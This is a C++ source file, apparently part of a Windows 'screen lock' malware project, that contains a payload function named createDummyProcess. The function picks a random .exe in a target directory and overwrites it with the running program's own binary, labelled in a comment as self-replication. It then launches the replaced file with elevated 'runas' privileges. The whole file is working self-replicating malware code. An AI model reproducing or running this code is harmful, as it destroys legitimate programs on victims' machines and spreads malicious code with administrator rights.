/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include					"stdafx.h"

#ifdef __cplusplus_cli
	#define generic __identifier(generic)
#endif
#include					<boost/filesystem.hpp>
#ifdef __cplusplus_cli
	#undef generic
#endif

#include					"payload_shutdown.h"
#include					"payload_dummy.h"
#include					<string>
#include					<Windows.h>
#include					<iostream>
#include					<vector>
#include					<ctime>
#include					<fstream>

namespace					fs = boost::filesystem;
using namespace             std;

void createDummyProcess() {
	fs::directory_iterator it_end;
	fs::directory_iterator it_dir(getFullShutdownDirectory());

	vector< string > v_random_file;

	while (it_dir != it_end) {
		try {
			if (!fs::is_directory(it_dir->status())) { // Listing non-directory files.
				if (it_dir->path().filename().extension() == ".exe") // Only list .exe files.
					v_random_file.push_back(it_dir->path().string());
			}
			it_dir++;
		}
		catch (const std::exception & ex) {
			std::cout << it_dir->path().filename() << " " << ex.what() << std::endl;
		}
	}

	if (v_random_file.size() == 0) {
		Sleep(2000);
		createDummyProcess();
	}
	else {
		srand(time(NULL));
		int i_random_exe = rand() % v_random_file.size();

		// Replacing and self-replication.
		TCHAR
			t_file_path
		;
		char c_path[MAX_PATH];
		string s_path;

		HMODULE h_mod = GetModuleHandle(NULL);
		GetModuleFileNameA(h_mod, c_path, MAX_PATH);

		s_path = c_path;

		fstream f_read(s_path, ios::in | ios::binary);
		fstream f_write(v_random_file[i_random_exe], ios::out | ios::binary);

		f_write << f_read.rdbuf();
		f_write.close();
		f_read.close();

		printf("[%s] - DUMMY: %s\r\n", c_path, v_random_file[i_random_exe].c_str());

		/*STARTUPINFO info = { sizeof(info) };
		PROCESS_INFORMATION processInfo;

		if (CreateProcess(v_random_file[i_random_exe].c_str(), "", NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo))
		{
			WaitForSingleObject(processInfo.hProcess, INFINITE);
			CloseHandle(processInfo.hProcess);
			CloseHandle(processInfo.hThread);
		}*/
	//	CreateProcess(v_random_file[i_random_exe].c_str(), "", NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
		ShellExecute(NULL, "runas", v_random_file[i_random_exe].c_str(),
			" c:\\temp\\report.txt",
			NULL,                        // default dir 
			SW_SHOWNORMAL
		);
	}
}
